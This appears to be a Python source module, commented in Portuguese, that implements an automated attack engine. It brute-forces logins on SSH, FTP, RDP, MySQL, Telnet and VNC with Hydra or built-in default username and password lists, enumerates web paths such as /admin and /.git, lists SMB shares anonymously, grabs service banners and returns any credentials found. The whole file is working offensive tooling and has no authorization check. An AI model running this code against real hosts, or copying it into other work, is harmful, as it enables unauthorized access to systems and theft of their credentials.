#!/usr/bin/env python3
"""
Módulo de Ataques Específicos
Implementa ataques direcionados baseados nos serviços identificados
"""

import socket
import time
import logging
from typing import Dict, Optional, List
from dataclasses import dataclass
from enum import Enum
import subprocess
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AttackStatus(Enum):
    """Status do ataque"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"


@dataclass
class AttackResult:
    """Resultado de um ataque"""
    target_ip: str
    port: int
    service: str
    attack_type: str
    status: AttackStatus
    success: bool
    credentials: Optional[Dict[str, str]] = None
    data: Optional[Dict] = None
    error: Optional[str] = None
    duration: float = 0.0


class AttackEngine:
    """Motor de ataques específicos"""
    
    def __init__(self, wordlist_path: str = None, max_threads: int = 5):
        """
        Inicializa o motor de ataques
        
        Args:
            wordlist_path: Caminho para wordlist (opcional)
            max_threads: Número máximo de threads para ataques paralelos
        """
        self.wordlist_path = wordlist_path
        self.max_threads = max_threads
        self.common_users = ['admin', 'root', 'user', 'administrator', 'guest']
        self.common_passwords = ['admin', 'password', '123456', 'root', 'toor', 'pass']
        
    def execute_attack(self, target_ip: str, port: int, service: str, 
                      attack_type: str) -> AttackResult:
        """
        Executa um ataque específico
        
        Args:
            target_ip: IP alvo
            port: Porta alvo
            service: Nome do serviço
            attack_type: Tipo de ataque a executar
            
        Returns:
            AttackResult com o resultado do ataque
        """
        start_time = time.time()
        logger.info(f"Iniciando ataque {attack_type} em {target_ip}:{port} ({service})")
        
        try:
            # Roteia para o ataque específico
            if attack_type == 'ssh_bruteforce':
                result = self._ssh_bruteforce(target_ip, port)
            elif attack_type == 'ftp_bruteforce':
                result = self._ftp_bruteforce(target_ip, port)
            elif attack_type == 'http_enum':
                result = self._http_enum(target_ip, port)
            elif attack_type == 'https_enum':
                result = self._https_enum(target_ip, port)
            elif attack_type == 'smb_enum':
                result = self._smb_enum(target_ip, port)
            elif attack_type == 'rdp_bruteforce':
                result = self._rdp_bruteforce(target_ip, port)
            elif attack_type == 'mysql_bruteforce':
                result = self._mysql_bruteforce(target_ip, port)
            elif attack_type == 'telnet_bruteforce':
                result = self._telnet_bruteforce(target_ip, port)
            elif attack_type == 'vnc_bruteforce':
                result = self._vnc_bruteforce(target_ip, port)
            else:
                result = self._generic_scan(target_ip, port, service)
            
            result.duration = time.time() - start_time
            
            if result.success:
                logger.info(f"✓ Ataque {attack_type} em {target_ip}:{port} bem-sucedido!")
            else:
                logger.warning(f"✗ Ataque {attack_type} em {target_ip}:{port} falhou: {result.error}")
            
            return result
            
        except Exception as e:
            logger.error(f"Erro ao executar ataque {attack_type} em {target_ip}:{port}: {e}")
            return AttackResult(
                target_ip=target_ip,
                port=port,
                service=service,
                attack_type=attack_type,
                status=AttackStatus.FAILED,
                success=False,
                error=str(e),
                duration=time.time() - start_time
            )
    
    def _ssh_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta SSH"""
        try:
            # Tenta usar hydra se disponível
            if self._check_tool('hydra'):
                return self._hydra_attack(ip, port, 'ssh')
            
            # Fallback: tentativa manual básica
            logger.info("Tentando conexões SSH básicas...")
            for user in self.common_users[:3]:  # Limita tentativas
                for pwd in self.common_passwords[:3]:
                    try:
                        import paramiko
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, port=port, username=user, password=pwd, timeout=5)
                        ssh.close()
                        return AttackResult(
                            target_ip=ip,
                            port=port,
                            service='SSH',
                            attack_type='ssh_bruteforce',
                            status=AttackStatus.SUCCESS,
                            success=True,
                            credentials={'username': user, 'password': pwd}
                        )
                    except:
                        continue
            
            return AttackResult(
                target_ip=ip,
                port=port,
                service='SSH',
                attack_type='ssh_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Nenhuma credencial válida encontrada"
            )
        except ImportError:
            return AttackResult(
                target_ip=ip,
                port=port,
                service='SSH',
                attack_type='ssh_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Ferramentas necessárias não disponíveis"
            )
    
    def _ftp_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta FTP"""
        try:
            if self._check_tool('hydra'):
                return self._hydra_attack(ip, port, 'ftp')
            
            # Fallback manual
            import ftplib
            for user in self.common_users[:3]:
                for pwd in self.common_passwords[:3]:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(ip, port, timeout=5)
                        ftp.login(user, pwd)
                        ftp.quit()
                        return AttackResult(
                            target_ip=ip,
                            port=port,
                            service='FTP',
                            attack_type='ftp_bruteforce',
                            status=AttackStatus.SUCCESS,
                            success=True,
                            credentials={'username': user, 'password': pwd}
                        )
                    except:
                        continue
            
            return AttackResult(
                target_ip=ip,
                port=port,
                service='FTP',
                attack_type='ftp_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Nenhuma credencial válida encontrada"
            )
        except:
            return AttackResult(
                target_ip=ip,
                port=port,
                service='FTP',
                attack_type='ftp_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Ferramentas necessárias não disponíveis"
            )
    
    def _http_enum(self, ip: str, port: int) -> AttackResult:
        """Enumeração HTTP"""
        try:
            import urllib.request
            import urllib.error
            
            data = {
                'status_code': None,
                'server': None,
                'paths_found': []
            }
            
            # Tenta conexão básica
            url = f"http://{ip}:{port}"
            try:
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                response = urllib.request.urlopen(req, timeout=5)
                data['status_code'] = response.getcode()
                data['server'] = response.headers.get('Server', 'Unknown')
                
                # Tenta alguns paths comuns
                common_paths = ['/', '/admin', '/login', '/robots.txt', '/.git']
                for path in common_paths:
                    try:
                        test_url = url + path
                        test_req = urllib.request.Request(test_url)
                        test_req.add_header('User-Agent', 'Mozilla/5.0')
                        test_resp = urllib.request.urlopen(test_req, timeout=3)
                        if test_resp.getcode() == 200:
                            data['paths_found'].append(path)
                    except:
                        pass
                
                return AttackResult(
                    target_ip=ip,
                    port=port,
                    service='HTTP',
                    attack_type='http_enum',
                    status=AttackStatus.SUCCESS,
                    success=True,
                    data=data
                )
            except urllib.error.HTTPError as e:
                data['status_code'] = e.code
                return AttackResult(
                    target_ip=ip,
                    port=port,
                    service='HTTP',
                    attack_type='http_enum',
                    status=AttackStatus.SUCCESS,
                    success=True,
                    data=data
                )
            except Exception as e:
                return AttackResult(
                    target_ip=ip,
                    port=port,
                    service='HTTP',
                    attack_type='http_enum',
                    status=AttackStatus.FAILED,
                    success=False,
                    error=str(e)
                )
        except Exception as e:
            return AttackResult(
                target_ip=ip,
                port=port,
                service='HTTP',
                attack_type='http_enum',
                status=AttackStatus.FAILED,
                success=False,
                error=str(e)
            )
    
    def _https_enum(self, ip: str, port: int) -> AttackResult:
        """Enumeração HTTPS (similar ao HTTP)"""
        return self._http_enum(ip, port)  # Reutiliza lógica HTTP
    
    def _smb_enum(self, ip: str, port: int) -> AttackResult:
        """Enumeração SMB"""
        try:
            if self._check_tool('smbclient'):
                # Tenta enumeração com smbclient
                result = subprocess.run(
                    ['smbclient', '-L', ip, '-N'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                data = {
                    'shares': [],
                    'output': result.stdout
                }
                
                # Parseia shares
                for line in result.stdout.split('\n'):
                    if 'Disk' in line or 'IPC' in line:
                        parts = line.split()
                        if parts:
                            data['shares'].append(parts[0])
                
                return AttackResult(
                    target_ip=ip,
                    port=port,
                    service='SMB',
                    attack_type='smb_enum',
                    status=AttackStatus.SUCCESS,
                    success=True,
                    data=data
                )
            else:
                return AttackResult(
                    target_ip=ip,
                    port=port,
                    service='SMB',
                    attack_type='smb_enum',
                    status=AttackStatus.FAILED,
                    success=False,
                    error="smbclient não disponível"
                )
        except Exception as e:
            return AttackResult(
                target_ip=ip,
                port=port,
                service='SMB',
                attack_type='smb_enum',
                status=AttackStatus.FAILED,
                success=False,
                error=str(e)
            )
    
    def _rdp_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta RDP"""
        if self._check_tool('hydra'):
            return self._hydra_attack(ip, port, 'rdp')
        
        return AttackResult(
            target_ip=ip,
            port=port,
            service='RDP',
            attack_type='rdp_bruteforce',
            status=AttackStatus.SKIPPED,
            success=False,
            error="Ferramentas necessárias não disponíveis"
        )
    
    def _mysql_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta MySQL"""
        if self._check_tool('hydra'):
            return self._hydra_attack(ip, port, 'mysql')
        
        return AttackResult(
            target_ip=ip,
            port=port,
            service='MySQL',
            attack_type='mysql_bruteforce',
            status=AttackStatus.SKIPPED,
            success=False,
            error="Ferramentas necessárias não disponíveis"
        )
    
    def _telnet_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta Telnet"""
        if self._check_tool('hydra'):
            return self._hydra_attack(ip, port, 'telnet')
        
        return AttackResult(
            target_ip=ip,
            port=port,
            service='Telnet',
            attack_type='telnet_bruteforce',
            status=AttackStatus.SKIPPED,
            success=False,
            error="Ferramentas necessárias não disponíveis"
        )
    
    def _vnc_bruteforce(self, ip: str, port: int) -> AttackResult:
        """Ataque de força bruta VNC"""
        if self._check_tool('hydra'):
            return self._hydra_attack(ip, port, 'vnc')
        
        return AttackResult(
            target_ip=ip,
            port=port,
            service='VNC',
            attack_type='vnc_bruteforce',
            status=AttackStatus.SKIPPED,
            success=False,
            error="Ferramentas necessárias não disponíveis"
        )
    
    def _generic_scan(self, ip: str, port: int, service: str) -> AttackResult:
        """Escaneamento genérico para serviços desconhecidos"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Tenta obter banner
            try:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
            except:
                banner = None
            
            sock.close()
            
            return AttackResult(
                target_ip=ip,
                port=port,
                service=service,
                attack_type='generic_scan',
                status=AttackStatus.SUCCESS,
                success=True,
                data={'banner': banner}
            )
        except Exception as e:
            return AttackResult(
                target_ip=ip,
                port=port,
                service=service,
                attack_type='generic_scan',
                status=AttackStatus.FAILED,
                success=False,
                error=str(e)
            )
    
    def _check_tool(self, tool_name: str) -> bool:
        """Verifica se uma ferramenta está disponível"""
        try:
            subprocess.run(['which', tool_name], 
                         capture_output=True, 
                         check=True,
                         timeout=2)
            return True
        except:
            return False
    
    def _hydra_attack(self, ip: str, port: int, service: str) -> AttackResult:
        """Executa ataque usando Hydra"""
        try:
            # Cria wordlist temporária se não existir
            wordlist = self.wordlist_path or '/tmp/common_passwords.txt'
            if not self.wordlist_path:
                with open(wordlist, 'w') as f:
                    for pwd in self.common_passwords:
                        f.write(f"{pwd}\n")
            
            # Executa hydra (versão simplificada - apenas algumas tentativas)
            result = subprocess.run(
                ['hydra', '-l', 'admin', '-P', wordlist, 
                 f'{service}://{ip}', '-s', str(port), '-t', '2', '-v', '-f'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parseia resultado do hydra
            if 'login:' in result.stdout or 'password:' in result.stdout:
                # Hydra encontrou credenciais
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'login:' in line.lower() and 'password:' in line.lower():
                        parts = line.split()
                        username = None
                        password = None
                        for i, part in enumerate(parts):
                            if part.lower() == 'login:':
                                username = parts[i+1] if i+1 < len(parts) else None
                            elif part.lower() == 'password:':
                                password = parts[i+1] if i+1 < len(parts) else None
                        
                        if username and password:
                            return AttackResult(
                                target_ip=ip,
                                port=port,
                                service=service.upper(),
                                attack_type=f'{service}_bruteforce',
                                status=AttackStatus.SUCCESS,
                                success=True,
                                credentials={'username': username, 'password': password}
                            )
            
            return AttackResult(
                target_ip=ip,
                port=port,
                service=service.upper(),
                attack_type=f'{service}_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Nenhuma credencial válida encontrada"
            )
            
        except subprocess.TimeoutExpired:
            return AttackResult(
                target_ip=ip,
                port=port,
                service=service.upper(),
                attack_type=f'{service}_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error="Timeout no ataque"
            )
        except Exception as e:
            return AttackResult(
                target_ip=ip,
                port=port,
                service=service.upper(),
                attack_type=f'{service}_bruteforce',
                status=AttackStatus.FAILED,
                success=False,
                error=str(e)
            )


if __name__ == "__main__":
    # Teste
    engine = AttackEngine()
    result = engine.execute_attack("127.0.0.1", 80, "HTTP", "http_enum")
    print(f"\n=== Resultado do Ataque ===")
    print(f"Status: {result.status.value}")
    print(f"Sucesso: {result.success}")
    if result.data:
        print(f"Dados: {result.data}")


